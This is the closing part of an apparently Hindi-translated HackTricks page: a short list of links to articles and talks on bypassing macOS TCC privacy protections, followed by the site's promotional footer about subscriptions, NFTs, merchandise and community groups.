* [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
* [**20+ Ways to Bypass Your macOS Privacy Mechanisms**](https://www.youtube.com/watch?v=W9GxnP8c8FU)
* [**Knockout Win Against TCC - 20+ NEW Ways to Bypass Your MacOS Privacy Mechanisms**](https://www.youtube.com/watch?v=a9hsxPdRxsY)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी कंपनी को **HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आप **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड** करने की इच्छा रखते हैं? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) का संग्रह
* [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com) प्राप्त करें
* **[💬](https://emojipedia.org/speech-balloon/) [Discord समूह](https://discord.gg/hRep4RUj7f) या [telegram समूह](https://t.me/peass) में शामिल हों** या मुझे **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)** का** अनुसरण करें।
* **अपने हैकिंग ट्रिक्स साझा करें, PRs के माध्यम से** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **को सबमिट करके।**

</details>
